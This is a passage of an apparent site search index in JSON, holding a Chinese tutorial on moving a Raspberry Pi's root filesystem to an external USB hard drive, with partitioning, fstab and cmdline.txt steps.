\u8fde\u63a5\u5230\u6811\u8393\u6d3e\uff0c\u8fd9\u90e8\u5206\u662f\u53ef\u8bfb\u5199\u7684\u3002 \u6211\u4eec\u9996\u5148\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\uff0c\u4ece\u6811\u8393\u6d3e\u7684\u7f51\u7ad9\u4e0a \u4e0b\u8f7d Raspbian \u955c\u50cf\uff0c\u6309\u7167 \u5b98\u65b9\u7684\u6307\u5bfc \uff0c\u5b89\u88c5\u5230 SD \u5361\u4e0a\u3002\u8fd9\u91cc\u7b80\u8981\u8bf4\u4e00\u4e0b\u5728 Mac OS X \u4e0a\u7684\u5b89\u88c5\u65b9\u5f0f\uff1a # \u9996\u5148\u5c06 SD \u5361\u63d2\u5165\u9002\u914d\u5668\uff0c\u8fde\u63a5\u5230 Mac # \u6253\u5f00\u7ec8\u7aef # \u5728\u5217\u51fa\u7684\u78c1\u76d8\u4e2d\u627e\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907\uff0c\u4f8b\u5982 /dev/disk4 diskutil list # unmount diskutil unmountDisk /dev/disk4 # \u8fd9\u91cc\u66ff\u6362\u6210\u4f60\u7684 SD \u5361\u8bbe\u5907 # \u627e\u5230\u4f60\u4e0b\u8f7d\u7684\u955c\u50cf\uff08\u89e3\u538b\u7684 .img \u6587\u4ef6\uff09\uff0c\u5199\u5165\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907 sudo dd bs=1m if=image.img of=/dev/rdisk4 # \u8fd9\u91cc\u6ce8\u610f\u662f rdisk # \u5199\u5165\u5b8c\u6210\u540e\u4ece Finder \u91cc\u5f39\u51fa SD \u5361\u5c31\u597d\u4e86 \u7136\u540e\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\u8fdb\u884c\u7b2c\u4e00\u6b21\u542f\u52a8\uff0c\u4e5f\u53ef\u4ee5\u505a\u4e00\u4e9b\u7b80\u5355\u8bbe\u7f6e\u7684\u8c03\u6574\u3002\u6211\u662f\u63a5\u4e86\u952e\u76d8\u548c\u663e\u793a\u5668\u542f\u52a8\u7684\uff0c\u8fdb\u53bb\u540e\u9996\u5148\u6253\u5f00 raspi-config \u628a\u56fe\u5f62\u754c\u9762\u5173\u6389\u4e86\uff0c\u7136\u540e\u6253\u5f00\u4e86\u6444\u50cf\u5934\u3001I2C \u548c SPI \u8bbe\u5907\uff0c\u7136\u540e\u6211\u5c31\u91cd\u542f\u4e86\u3002\u63a5\u4e0b\u6765\u6211\u90fd\u662f\u901a\u8fc7 ssh \u8fdb\u884c\u7684\u64cd\u4f5c\u3002 \u901a\u8fc7 USB \u8fde\u63a5\u79fb\u52a8\u786c\u76d8\u3002 sudo fdisk -l \u770b\u4e00\u4e0b\u662f\u54ea\u4e2a\u8bbe\u5907\uff0c\u4e00\u822c\u90fd\u662f /dev/sda \u4e4b\u7c7b\u7684\u3002 \u5982\u679c\u6709\u4e0d\u60f3\u8981\u7684\u5206\u533a\u9700\u8981\u5220\u6389\u817e\u51fa\u7a7a\u95f4\u7684\u8bdd\uff0c sudo fdisk /dev/sda \u6253\u5f00 fdisk \u5de5\u5177\uff0c\u628a\u4e0d\u8981\u7684\u5206\u533a\u5220\u6389\uff0c\u65b0\u5efa\u4e00\u4e2a 30GB \u5206\u533a\u3002\u5177\u4f53\u600e\u4e48\u64cd\u4f5c\uff0c\u4ea4\u4e92\u6a21\u5f0f\u4e0b\u6709\u5e2e\u52a9\uff0c\u6ce8\u610f\u4e0d\u8981\u5220\u6389\u4e86\u60f3\u4fdd\u7559\u7684\u5206\u533a\u5373\u53ef\u3002\u5728\u4f60\u8f93\u5165 w \u547d\u4ee4\u6267\u884c\u5199\u5165\u4e4b\u524d\uff0c\u6240\u6709\u6539\u52a8\u90fd\u662f\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u4f60\u89c9\u5f97\u6709\u95ee\u9898\u7684\u8bdd\uff0c Ctrl-C \u9000\u51fa\u91cd\u6765\u5c31\u597d\u3002 \u521b\u5efa\u597d\u5206\u533a\u4e4b\u540e\u683c\u5f0f\u5316\u6210 ext4\uff1a sudo mkfs.ext4 /dev/sda1 \u3002 \u8fd0\u884c sudo gdisk /dev/sda \u8fdb\u5165 gdisk \u5de5\u5177\u7684\u4ea4\u4e92\u6a21\u5f0f\u3002\u5728\u8fd9\u91cc\u68c0\u89c6\u4e00\u4e0b\u4f60\u60f3\u7528\u4e8e Raspbian \u7684\u5206\u533a\uff0c\u83b7\u53d6\u5230 UUID\u3002\u4ee5\u4e0b\u4f8b\u5b50\u6765\u81ea Stefan\u2019s Blog root@raspberrypi:/home/pi# gdisk /dev/sda GPT fdisk (gdisk) version 0.8.5 Partition table scan: MBR: hybrid BSD: not present APM: not present GPT: present Found valid GPT with hybrid MBR; using GPT. Command (? for help): i Partition number (1-3): 2 Partition GUID code: 0FC63DAF-8483-4772-8E79-3D69D8477DE4 (Linux filesystem) Partition unique GUID: 176ADF0D-357D-4C4B-ADC0-371342F444AB First sector: 2099200 (at 1.0 GiB) Last sector: 23070719 (at 11.0 GiB) Partition size: 20971520 sectors (10.0 GiB) Attribute flags: 0000000000000000 Partition name: '' Command (? for help): q UUID \u662f\u8ddf\u5728 \u201cPartition unique GUID\u201d \u540e\u9762\u90a3\u4e32\u5b57\u6bcd\uff0c\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u4e5f\u5c31\u662f 176ADF0D-357D-4C4B-ADC0-371342F444AB \u3002 \u63a5\u4e0b\u6765\u7f16\u8f91 /boot/cmdline.txt \uff0c\u5c06\u5176\u4e2d root=/dev/mmcblk0p2 \u6539\u4e3a root=PARTUUID=\u5206\u533a\u7684UUID \u7136\u540e\u4fdd\u5b58\u3002 \u968f\u540e\uff0c\u7f16\u8f91 /etc/fstab \u5c06 /boot \u6302\u8f7d\u4e3a\u53ea\u8bfb\u6a21\u5f0f\uff0c\u5c06\u79fb\u52a8\u786c\u76d8\u4e5f\u6dfb\u52a0\u8fdb\u53bb\uff0c\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u3002\u9ed8\u8ba4\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u7684\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat defaults 0 2 /dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u66f4\u6539\u4e4b\u540e\u5185\u5bb9\u5927\u6982\u50cf\u8fd9\u6837\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat ro 0 2 /dev/sda1 / ext4 defaults,errors=remount-ro 0 1 #/dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u6700\u540e\uff0c\u5c06 / \u4e0b\u7684\u5185\u5bb9\u5168\u90e8\u5199\u5165\u5230\u79fb\u52a8\u786c\u76d8\u4e2d\u3002\u4ee5\u6211\u81ea\u5df1\u7684\u914d\u7f6e\u4e3a\u4f8b\uff0c\u4f7f\u7528 /dev/sda1 \u5206\u533a\uff1a dd if=/dev/mmcblk0p2 of=/dev/sda1 \u56e0\u4e3a Raspbian \u9ed8\u8ba4\u662f\u5c06 SD \u5361\u7684\u7b2c\u4e8c\u4e2a\u5206\u533a\uff08\u4e5f\u5c31\u662f /dev/mmcblk0p2 \uff09\u6302\u8f7d\u5230 / \u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u4ece\u8fd9\u4e2a\u5206\u533a\u8bfb\u53d6\uff0c\u5199\u5165\u5230\u76ee\u6807\u5206\u533a\u5c31\u53ef\u4ee5\u3002 \u5199\u5165\u5b8c\u6210\u4e4b\u540e\uff0c /dev/sda1 \u7684\u5927\u5c0f\u4e0e /dev/mmcblk0p2 \u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u4f1a\u8fdc\u8fdc\u5c0f\u4e8e\u4f60\u521b\u5efa\u8fd9\u4e2a\u5206\u533a\u65f6\u6307\u5b9a\u7684\u5927\u5c0f\u3002\u53ef\u4ee5\u4f7f\u7528 sudo resize2fs /dev/sda1 \u6765\u5c55\u5f00\u5230\u5b8c\u6574\u7684\u5927\u5c0f\u3002 \u63a5\u4e0b\u6765\u91cd\u542f\u5c31\u597d\u4e86\u3002 \u5728\u8fc7\u7a0b\u4e2d\u5982\u679c\u4e0d\u614e\u4fee\u6539\u9519\u4e86\u53c2\u6570\uff0c\u6216\u8005\u5c06\u4e0d\u6b63\u786e\u7684\u5206\u533a\u6302\u8f7d\u4e3a\u53ea\u8bfb\u4e86\uff0c\u4e0d\u5fc5\u60ca\u614c\uff0c\u4e5f\u4e0d\u9700\u8981\u9a6c\u4e0a\u91cd\u88c5\u7cfb\u7edf\u3002\u53ea\u8981\u5c06\u6811\u8393\u6d3e\u65ad\u7535\uff0cSD \u5361\u62d4\u51fa\u6765\u8fde\u63a5\u5230\u522b\u7684\u7535\u8111\u4e0a\uff0c\u4fee\u6539 /boot/cmdline.txt \u91cc\u7684\u53c2\u6570\uff0c\u6539\u4e3a\u9ed8\u8ba4\u7684\u6302\u8f7d SD \u5361\u7b2c\u4e8c\u5206\u533a\u5373\u53ef\u3002\u91cd\u542f\u540e\u53ef\u4ee5\u901a\u8fc7 sudo mount -o remount,rw /dev/sda1 \u5c06 /etc/fstab \u4e2d\u6307\u5b9a\u7684\u5206\u533a\u91cd\u65b0\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u6a21\u5f0f\u6765\u8fdb\u884c\u4fee\u6539\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.mynook.info/post/boot-raspberrypi-from-external-hdd/","title":"\u8bbe\u7f6e\u6811\u8393\u6d3e\u4f7f\u7528\u5916\u7f6e\u786c\u76d8\u542f\u52a8"},{"location":"RPI/%E8%AE%BE%E7%BD%AE%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8/#_1","text":"\u6574\u4ef6\u4e8b\u60c5\u662f\u8fd9\u6837\u7684\uff1a\u67d0\u4e00\u5929\u6211\u5c1d\u8bd5\u5728\u6811\u8393\u6d3e\u4e0a\u5b89\u88c5\u4e00\u4e2a vim \u7684\u7f16\u8f91\u5668\u63d2\u4ef6 YouCompleteMe \uff0c\u9700\u8981\u4ece\u6e90\u7801\u7f16\u8bd1\u3002\u7f16\u8bd1\u8fd9\u4e2a\u6bd4\u8f83\u8017\u8d39\u5185\u5b58\uff0c\u53ef\u80fd\u6211\u5206\u914d\u7684 SWAP \u4e0d\u591f\u5927\uff081024MB\uff09\uff0c\u5bfc\u81f4\u5185\u5b58\u4e0d\u8db3\uff0c\u7136\u540e sshd \u5c31\u6302\u4e86\u3002\u55ef\uff0c\u5e76\u4e14\u5df2\u7ecf\u8fc7\u53bb\u4e86\u4e00\u4e2a\u5c0f\u65f6\u6211\u4e5f\u6ca1\u6cd5\u8fde\u63a5\u4e0a\u53bb\u3002\u4e8e\u662f\u6211\u5c31\u62d4\u7535\u6e90\u91cd\u542f\u4e86\uff0c\u8fd9\u4e0b\u53ef\u597d\uff0cSD \u5361\u5f7b\u5e95\u542f\u52a8\u4e0d\u4e86\u4e86\uff0c\u4f30\u8ba1\u662f\u6587\u4ef6\u7cfb\u7edf\u635f\u574f\u4e4b\u7c7b\u7684\u3002\u4e0a\u7f51\u641c\u4e86\u4e00\u4e0b\u8fd9\u79cd\u73b0\u8c61\u4f3c\u4e4e\u975e\u5e38\u5e38\u89c1\uff0c\u53ea\u8981\u5728\u65ad\u7535\u65f6 SD \u5361\u8fd8\u5728\u5199\u5165\u5c31\u53ef\u80fd\u51fa\u73b0\u3002\u4e8e\u662f\u6211\u5c31\u60f3\u5230\u8981\u628a\u7cfb\u7edf\u88c5\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\u3002 \u9996\u5148\u786c\u4ef6\u914d\u7f6e\u662f\u8fd9\u6837\u7684\uff1a\u6211\u624b\u4e0a\u6709 8GB \u548c 16GB \u7684 C10 SD \u5361\u5404\u4e00\u5f20\uff0c500GB \u7684\u79fb\u52a8\u786c\u76d8\u4e00\u4e2a\uff08\u4e4b\u524d\u7b14\u8bb0\u672c\u7684\u673a\u68b0\u786c\u76d8\uff0c\u6362 SSD \u7684\u65f6\u5019\u62c6\u4e0b\u6765\u88c5\u5728\u79fb\u52a8\u786c\u76d8\u76d2\u91cc\uff09\uff0c\u6709\u6e90 USB Hub \u4e00\u4e2a\uff0c\u6811\u8393\u6d3e\u4e00\u4e2a\u3002\u5176\u4e2d\u79fb\u52a8\u786c\u76d8\u4e0a\u6709\u4e24\u4e2a NTFS \u5206\u533a\uff08Windows \u7684 C\u76d8\u548c D\u76d8\uff09\u548c\u4e00\u4e2a ext4 \u5206\u533a\uff08\u5f88\u4e45\u4ee5\u524d\u7684 Ubuntu \u7cfb\u7edf\uff0c\u6240\u6709\u6570\u636e\u90fd\u5728\u91cc\u9762\uff09\u3002 \u6211\u60f3\u5b9e\u73b0\u7684\u6548\u679c\u662f\u8fd9\u6837\u7684\uff1a\u6e05\u7a7a\u65e7\u7684 Windows C\u76d8\uff0890GB\uff09\uff0c\u5206\u51fa 30GB \u7ed9 Raspbian\uff0c\u7136\u540e\u6811\u8393\u6d3e\u8981\u4ece\u786c\u76d8\u542f\u52a8\u3002 \u7b80\u5355\u641c\u7d22\u4e86\u4e00\u4e0b\u53d1\u73b0\u76f4\u63a5\u4ece\u786c\u76d8\u542f\u52a8\u662f\u4e0d\u884c\u7684\uff0c\u56e0\u4e3a\u6811\u8393\u6d3e\u542f\u52a8\u7684\u65f6\u5019\u56fa\u5b9a\u662f\u4ece SD \u5361\u7684\u7b2c\u4e00\u4e2a\u5206\u533a\uff08/boot\uff09\u8bfb\u53d6 config.txt \u3001 cmdline.txt \u548c kernel.img \u8fd9\u4e09\u4e2a\u6587\u4ef6\u3002\u4f46\u662f\u9664\u6b64\u4e4b\u5916\uff0c\u5404\u4e2a\u5916\u63a5\u8bbe\u5907\u7684\u6302\u8f7d\u70b9\u5219\u662f\u6ca1\u6709\u9650\u5236\u7684\u3002\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5c06 /boot \u5206\u533a\u653e\u5728 SD \u5361\u4e0a\uff0c\u5e76\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\u7684\uff0c\u907f\u514d\u610f\u5916\u5173\u673a\u65f6\u635f\u574f\u4e0a\u9762\u7684\u6587\u4ef6\u7cfb\u7edf\uff1b\u540c\u65f6\u6211\u4eec\u628a\u7cfb\u7edf\u7684\u5176\u4ed6\u90e8\u5206\u90fd\u653e\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\uff0c\u901a\u8fc7 USB \u8fde\u63a5\u5230\u6811\u8393\u6d3e\uff0c\u8fd9\u90e8\u5206\u662f\u53ef\u8bfb\u5199\u7684\u3002 \u6211\u4eec\u9996\u5148\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\uff0c\u4ece\u6811\u8393\u6d3e\u7684\u7f51\u7ad9\u4e0a \u4e0b\u8f7d Raspbian \u955c\u50cf\uff0c\u6309\u7167 \u5b98\u65b9\u7684\u6307\u5bfc \uff0c\u5b89\u88c5\u5230 SD \u5361\u4e0a\u3002\u8fd9\u91cc\u7b80\u8981\u8bf4\u4e00\u4e0b\u5728 Mac OS X \u4e0a\u7684\u5b89\u88c5\u65b9\u5f0f\uff1a # \u9996\u5148\u5c06 SD \u5361\u63d2\u5165\u9002\u914d\u5668\uff0c\u8fde\u63a5\u5230 Mac # \u6253\u5f00\u7ec8\u7aef # \u5728\u5217\u51fa\u7684\u78c1\u76d8\u4e2d\u627e\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907\uff0c\u4f8b\u5982 /dev/disk4 diskutil list # unmount diskutil unmountDisk /dev/disk4 # \u8fd9\u91cc\u66ff\u6362\u6210\u4f60\u7684 SD \u5361\u8bbe\u5907 # \u627e\u5230\u4f60\u4e0b\u8f7d\u7684\u955c\u50cf\uff08\u89e3\u538b\u7684 .img \u6587\u4ef6\uff09\uff0c\u5199\u5165\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907 sudo dd bs=1m if=image.img of=/dev/rdisk4 # \u8fd9\u91cc\u6ce8\u610f\u662f rdisk # \u5199\u5165\u5b8c\u6210\u540e\u4ece Finder \u91cc\u5f39\u51fa SD \u5361\u5c31\u597d\u4e86 \u7136\u540e\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\u8fdb\u884c\u7b2c\u4e00\u6b21\u542f\u52a8\uff0c\u4e5f\u53ef\u4ee5\u505a\u4e00\u4e9b\u7b80\u5355\u8bbe\u7f6e\u7684\u8c03\u6574\u3002\u6211\u662f\u63a5\u4e86\u952e\u76d8\u548c\u663e\u793a\u5668\u542f\u52a8\u7684\uff0c\u8fdb\u53bb\u540e\u9996\u5148\u6253\u5f00 raspi-config \u628a\u56fe\u5f62\u754c\u9762\u5173\u6389\u4e86\uff0c\u7136\u540e\u6253\u5f00\u4e86\u6444\u50cf\u5934\u3001I2C \u548c SPI \u8bbe\u5907\uff0c\u7136\u540e\u6211\u5c31\u91cd\u542f\u4e86\u3002\u63a5\u4e0b\u6765\u6211\u90fd\u662f\u901a\u8fc7 ssh \u8fdb\u884c\u7684\u64cd\u4f5c\u3002 \u901a\u8fc7 USB \u8fde\u63a5\u79fb\u52a8\u786c\u76d8\u3002 sudo fdisk -l \u770b\u4e00\u4e0b\u662f\u54ea\u4e2a\u8bbe\u5907\uff0c\u4e00\u822c\u90fd\u662f /dev/sda \u4e4b\u7c7b\u7684\u3002 \u5982\u679c\u6709\u4e0d\u60f3\u8981\u7684\u5206\u533a\u9700\u8981\u5220\u6389\u817e\u51fa\u7a7a\u95f4\u7684\u8bdd\uff0c sudo fdisk /dev/sda \u6253\u5f00 fdisk \u5de5\u5177\uff0c\u628a\u4e0d\u8981\u7684\u5206\u533a\u5220\u6389\uff0c\u65b0\u5efa\u4e00\u4e2a 30GB \u5206\u533a\u3002\u5177\u4f53\u600e\u4e48\u64cd\u4f5c\uff0c\u4ea4\u4e92\u6a21\u5f0f\u4e0b\u6709\u5e2e\u52a9\uff0c\u6ce8\u610f\u4e0d\u8981\u5220\u6389\u4e86\u60f3\u4fdd\u7559\u7684\u5206\u533a\u5373\u53ef\u3002\u5728\u4f60\u8f93\u5165 w \u547d\u4ee4\u6267\u884c\u5199\u5165\u4e4b\u524d\uff0c\u6240\u6709\u6539\u52a8\u90fd\u662f\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u4f60\u89c9\u5f97\u6709\u95ee\u9898\u7684\u8bdd\uff0c Ctrl-C \u9000\u51fa\u91cd\u6765\u5c31\u597d\u3002 \u521b\u5efa\u597d\u5206\u533a\u4e4b\u540e\u683c\u5f0f\u5316\u6210 ext4\uff1a sudo mkfs.ext4 /dev/sda1 \u3002 \u8fd0\u884c sudo gdisk /dev/sda \u8fdb\u5165 gdisk \u5de5\u5177\u7684\u4ea4\u4e92\u6a21\u5f0f\u3002\u5728\u8fd9\u91cc\u68c0\u89c6\u4e00\u4e0b\u4f60\u60f3\u7528\u4e8e Raspbian \u7684\u5206\u533a\uff0c\u83b7\u53d6\u5230 UUID\u3002\u4ee5\u4e0b\u4f8b\u5b50\u6765\u81ea Stefan\u2019s Blog root@raspberrypi:/home/pi# gdisk /dev/sda GPT fdisk (gdisk) version 0.8.5 Partition table scan: MBR: hybrid BSD: not present APM: not present GPT: present Found valid GPT with hybrid MBR; using GPT. Command (? for help): i Partition number (1-3): 2 Partition GUID code: 0FC63DAF-8483-4772-8E79-3D69D8477DE4 (Linux filesystem) Partition unique GUID: 176ADF0D-357D-4C4B-ADC0-371342F444AB First sector: 2099200 (at 1.0 GiB) Last sector: 23070719 (at 11.0 GiB) Partition size: 20971520 sectors (10.0 GiB) Attribute flags: 0000000000000000 Partition name: '' Command (? for help): q UUID \u662f\u8ddf\u5728 \u201cPartition unique GUID\u201d \u540e\u9762\u90a3\u4e32\u5b57\u6bcd\uff0c\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u4e5f\u5c31\u662f 176ADF0D-357D-4C4B-ADC0-371342F444AB \u3002 \u63a5\u4e0b\u6765\u7f16\u8f91 /boot/cmdline.txt \uff0c\u5c06\u5176\u4e2d root=/dev/mmcblk0p2 \u6539\u4e3a root=PARTUUID=\u5206\u533a\u7684UUID \u7136\u540e\u4fdd\u5b58\u3002 \u968f\u540e\uff0c\u7f16\u8f91 /etc/fstab \u5c06 /boot \u6302\u8f7d\u4e3a\u53ea\u8bfb\u6a21\u5f0f\uff0c\u5c06\u79fb\u52a8\u786c\u76d8\u4e5f\u6dfb\u52a0\u8fdb\u53bb\uff0c\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u3002\u9ed8\u8ba4\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u7684\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat defaults 0 2 /dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u66f4\u6539\u4e4b\u540e\u5185\u5bb9\u5927\u6982\u50cf\u8fd9\u6837\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat ro 0 2 /dev/sda1 / ext4 defaults,errors=remount-ro 0 1 #/dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u6700\u540e\uff0c\u5c06 / \u4e0b\u7684\u5185\u5bb9\u5168\u90e8\u5199\u5165\u5230\u79fb\u52a8\u786c\u76d8\u4e2d\u3002\u4ee5\u6211\u81ea\u5df1\u7684\u914d\u7f6e\u4e3a\u4f8b\uff0c\u4f7f\u7528 /dev/sda1 \u5206\u533a\uff1a dd if=/dev/mmcblk0p2 of=/dev/sda1 \u56e0\u4e3a Raspbian \u9ed8\u8ba4\u662f\u5c06 SD \u5361\u7684\u7b2c\u4e8c\u4e2a\u5206\u533a\uff08\u4e5f\u5c31\u662f /dev/mmcblk0p2 \uff09\u6302\u8f7d\u5230 / \u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u4ece\u8fd9\u4e2a\u5206\u533a\u8bfb\u53d6\uff0c\u5199\u5165\u5230\u76ee\u6807\u5206\u533a\u5c31\u53ef\u4ee5\u3002 \u5199\u5165\u5b8c\u6210\u4e4b\u540e\uff0c /dev/sda1 \u7684\u5927\u5c0f\u4e0e /dev/mmcblk0p2 \u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u4f1a\u8fdc\u8fdc\u5c0f\u4e8e\u4f60\u521b\u5efa\u8fd9\u4e2a\u5206\u533a\u65f6\u6307\u5b9a\u7684\u5927\u5c0f\u3002\u53ef\u4ee5\u4f7f\u7528 sudo resize2fs /dev/sda1 \u6765\u5c55\u5f00\u5230\u5b8c\u6574\u7684\u5927\u5c0f\u3002 \u63a5\u4e0b\u6765\u91cd\u542f\u5c31\u597d\u4e86\u3002 \u5728\u8fc7\u7a0b\u4e2d\u5982\u679c\u4e0d\u614e\u4fee\u6539\u9519\u4e86\u53c2\u6570\uff0c\u6216\u8005\u5c06\u4e0d\u6b63\u786e\u7684\u5206\u533a\u6302\u8f7d\u4e3a\u53ea\u8bfb\u4e86\uff0c\u4e0d\u5fc5\u60ca\u614c\uff0c\u4e5f\u4e0d\u9700\u8981\u9a6c\u4e0a\u91cd\u88c5\u7cfb\u7edf\u3002\u53ea\u8981\u5c06\u6811\u8393\u6d3e\u65ad\u7535\uff0cSD \u5361\u62d4\u51fa\u6765\u8fde\u63a5\u5230\u522b\u7684\u7535\u8111\u4e0a\uff0c\u4fee\u6539 /boot/cmdline.txt \u91cc\u7684\u53c2\u6570\uff0c\u6539\u4e3a\u9ed8\u8ba4\u7684\u6302\u8f7d SD \u5361\u7b2c\u4e8c\u5206\u533a\u5373\u53ef\u3002\u91cd\u542f\u540e\u53ef\u4ee5\u901a\u8fc7 sudo mount -o remount,rw /dev/sda1 \u5c06 /etc/fstab \u4e2d\u6307\u5b9a\u7684\u5206\u533a\u91cd\u65b0\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u6a21\u5f0f\u6765\u8fdb\u884c\u4fee\u6539\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.mynook.info/post/boot-raspberrypi-from-external-hdd/","title":"\u8bbe\u7f6e\u6811\u8393\u6d3e\u4f7f\u7528\u5916\u7f6e\u786c\u76d8\u542f\u52a8"},{"location":"%E7%AE%97%E6%B3%95/","text":"","title":"\u7b97\u6cd5"}]}